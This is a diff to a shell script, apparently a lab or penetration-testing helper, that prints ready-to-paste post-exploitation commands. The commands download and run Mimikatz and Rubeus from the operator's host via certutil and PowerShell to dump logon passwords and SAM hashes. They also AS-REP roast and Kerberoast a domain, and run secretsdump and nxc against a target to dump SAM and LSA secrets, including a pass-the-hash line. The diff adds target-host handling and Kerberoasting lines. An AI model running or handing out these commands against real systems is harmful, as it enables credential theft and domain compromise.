@@ -7,6 +7,8 @@
 GREEN='\033[0;32m' # Green
 NC='\033[0m'       # No Color
 
+TOOLS_PORT=31337
+
 
 # Make this work for local lab also
 if ip -4 a show tun0 &> /dev/null; then
@@ -18,10 +20,12 @@ fi
 
 if [ $# -eq 0 ]
 then
-  TOOLS_PORT=31337
+  RHOST="10.10.10.10"
 else
-  TOOLS_PORT=$1
+  RHOST="$1"
 fi
+
+
 
 cat << "EOF"
             _           _     
@@ -37,11 +41,11 @@ EOF
 #https://patorjk.com/software/taag/#p=display&f=Big&t=Persistence
 
 echo -e "LHOST=${GREEN}$LHOST${NC}"
+echo -e "RHOST=${GREEN}$RHOST${NC}"
 echo -e "TOOLS_PORT=${GREEN}$TOOLS_PORT${NC}"
-
-echo ""
-
 echo
+echo
+
 echo '********** Windows **********'
 echo
 echo "# Mimikatz"
@@ -49,7 +53,6 @@ echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/windows/mimikatz.exe C
 echo
 echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/windows/mimikatz.exe C:\Windows\Temp\mimikatz.exe && C:\Windows\Temp\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"exit\""
 echo
-
 echo "iwr -Uri http://$LHOST:$TOOLS_PORT/windows/mimikatz.exe -OutFile C:\Windows\Temp\mimikatz.exe | & C:\Windows\Temp\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"exit\""
 echo
 echo "iwr -Uri http://$LHOST:$TOOLS_PORT/windows/mimikatz.exe -OutFile C:\Windows\Temp\mimikatz.exe | & C:\Windows\Temp\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"exit\""
@@ -57,22 +60,34 @@ echo
 echo
 echo "# Rubeus (Needs domain user)"
 echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/windows/Rubeus.exe C:\Windows\Temp\Rubeus.exe && C:\Windows\Temp\Rubeus.exe asreproast /nowrap"
+echo
 echo "iwr -Uri http://$LHOST:$TOOLS_PORT/windows/Rubeus.exe -OutFile C:\Windows\Temp\Rubeus.exe | C:\Windows\Temp\Rubeus.exe asreproast /nowrap"
 echo
+echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/windows/Rubeus.exe C:\Windows\Temp\Rubeus.exe && C:\Windows\Temp\Rubeus.exe kerberoast /nowrap"
+echo
+echo "iwr -Uri http://$LHOST:$TOOLS_PORT/windows/Rubeus.exe -OutFile C:\Windows\Temp\Rubeus.exe | C:\Windows\Temp\Rubeus.exe kerberoast /nowrap"
+echo
+echo
+
 echo '********** Linux **********'
 echo
 echo "# Dump secrets with Local user"
-echo "python3 /home/kali/.local/bin/secretsdump.py username:password@10.10.10.10"
+echo "python3 /home/kali/.local/bin/secretsdump.py username:password@$RHOST"
 echo
 echo "# Dump secrets with Domain user"
-echo "python3 /home/kali/.local/bin/secretsdump.py domain/username:password@10.10.10.10"
+echo "python3 /home/kali/.local/bin/secretsdump.py domain/username:password@$RHOST"
 echo
-echo "nxc smb 10.10.10.10 -u username -p password --sam"
-echo "nxc smb 10.10.10.10 -u username -p password --lsa"
-echo "nxc smb 10.10.10.10 -u username -p password --sam --local-auth"
-echo "nxc smb 10.10.10.10 -u username -p password --lsa --local-auth"
-echo "nxc smb 10.10.10.10 -u administrator -H 184fb5e5178480be64824d4cd53b99ee --sam"
-echo "nxc smb 10.10.10.10 -u administrator -H 184fb5e5178480be64824d4cd53b99ee --lsa"
+echo "nxc smb $RHOST -u username -p password --sam"
+echo "nxc smb $RHOST -u username -p password --lsa"
+echo "nxc smb $RHOST -u username -p password --sam --local-auth"
+echo "nxc smb $RHOST -u username -p password --lsa --local-auth"
+echo "nxc smb $RHOST -u administrator -H 184fb5e5178480be64824d4cd53b99ee --sam"
+echo "nxc smb $RHOST -u administrator -H 184fb5e5178480be64824d4cd53b99ee --lsa"
 echo
 echo "# Get AS-REP roastable hashes (Needs users.txt)"
-echo "nxc ldap 10.10.10.10 -u users.txt -p '' --asreproast ASREProastables.txt --kdc 10.10.10.10"
+echo "nxc ldap $RHOST -u users.txt -p '' --asreproast ASREProastables.txt --kdc $RHOST"
+echo
+echo "# Get Kerberoastable hashes (Needs a domain username/password)"
+echo "nxc ldap $RHOST -u <username> -p <password> --kerberoasting kerberoastables.txt --kdc $RHOST"
+echo
+echo
